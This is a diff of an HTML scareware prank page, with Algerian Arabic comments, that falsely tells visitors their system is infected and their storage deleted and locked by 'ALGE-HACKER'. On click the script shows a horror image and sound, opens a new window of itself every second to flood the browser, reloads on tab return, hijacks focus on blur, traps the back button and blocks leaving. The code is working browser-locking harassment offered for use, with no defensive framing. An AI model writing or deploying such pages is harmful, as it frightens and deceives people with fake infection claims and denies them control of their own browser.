@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚠️ SYSTEM_CRITICAL_ERROR ⚠️</title>
+    <title>⚠️ SYSTEM_CRITICAL_LOCK ⚠️</title>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: none; }
         #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 999; display: none; }
-        #messageBox { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 9999; color: #f00; text-align: center; font-family: 'Courier New', monospace; font-weight: bold; background: rgba(0,0,0,0.85); padding: 30px; border: 5px solid #f00; display: none; width: 85%; box-shadow: 0 0 20px #f00; }
+        #messageBox { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 9999; color: #f00; text-align: center; font-family: 'Courier New', monospace; font-weight: bold; background: rgba(0,0,0,0.85); padding: 30px; border: 5px solid #f00; display: none; width: 85%; box-shadow: 0 0 25px #f00; }
         .blink { animation: blinker 0.1s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
     </style>
@@ -15,14 +15,14 @@
 <body onclick="activateVirus()">
 
     <div id="messageBox" class="blink">
-        <h1 style="font-size: 35px;">⚠️ SYSTEM INFECTED ⚠️</h1>
-        <p style="font-size: 20px;">نظامك مات سواسوة.. الضحك خلاص درك!</p>
+        <h1 style="font-size: 30px;">⚠️ SYSTEM INFECTED ⚠️</h1>
+        <p style="font-size: 18px;">نظامك مات سواسوة.. الضحك خلاص درك!</p>
         <hr style="border: 1px solid #f00;">
-        <p style="font-size: 14px; color: #fff;">DELETING_INTERNAL_STORAGE... [100%]<br>ALL_DATA_ENCRYPTED_BY_ALGE-HACKER</p>
+        <p style="font-size: 13px; color: #fff;">STORAGE_DELETED: 100%<br>LOCKED_BY_ALGE-HACKER</p>
     </div>
 
     <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
-    <audio id="sfx" src="tfy-krk.mp3" preload="auto" loop></audio>
+    <audio id="sfx" src="tfy-krk.mp3" preload="auto"></audio>
 
     <script>
         let running = false;
@@ -31,9 +31,12 @@
         const img = document.getElementById('horrorImg');
         const MY_LINK = window.location.href;
 
-        // منع زر الرجوع سواسوة
-        history.pushState(null, null, location.href);
-        window.onpopstate = () => history.go(1);
+        // ميزة تكرار الصوت مع سكتة 4 ثواني سواسوة
+        audio.addEventListener('ended', function() {
+            setTimeout(() => {
+                if(running) audio.play();
+            }, 4000); 
+        });
 
         function activateVirus() {
             if (running) return;
@@ -45,33 +48,32 @@
             img.style.display = 'block';
             msg.style.display = 'block';
 
-            // ميزة اللاق وإغراق المتصفح بالتبويبات سواسوة
+            // إغراق النظام بالتبويبات سواسوة
             setInterval(() => {
                 window.open(MY_LINK, '_blank', 'width=10,height=10');
-                if(audio.paused) audio.play();
             }, 1000);
         }
 
-        // ميزة إجبار الدخول: غير يخرج ويرجع يلقى الصفحة تفتح وحدها سواسوة
+        // إجبار الدخول والتحكم في قوقل سواسوة
         document.addEventListener("visibilitychange", () => {
             if (document.visibilityState === 'visible' && running) {
-                location.reload(); // إعادة تحميل الصفحة لإجبار الصوت والصورة سواسوة
-                alert("⚠️ وين راك هارب؟ النظام تفيروسا خلاص سواسوة!");
+                location.reload();
+                alert("⚠️ وين راك هارب؟ النظام تفيروسا سواسوة!");
             }
         });
 
-        // ميزة التحكم في قوقل كروم سواسوة
         window.onblur = function() {
             if(running) {
                 setTimeout(() => {
-                    window.focus();
                     window.open(MY_LINK, '_self');
                 }, 400);
             }
         };
 
-        // منع الخروج سواسوة
-        window.onbeforeunload = () => "⚠️ طفي كراك.. راك محبوس سواسوة!";
+        // منع الرجوع سواسوة
+        history.pushState(null, null, location.href);
+        window.onpopstate = () => history.go(1);
+        window.onbeforeunload = () => "⚠️ راك محبوس سواسوة!";
     </script>
 </body>
 </html>
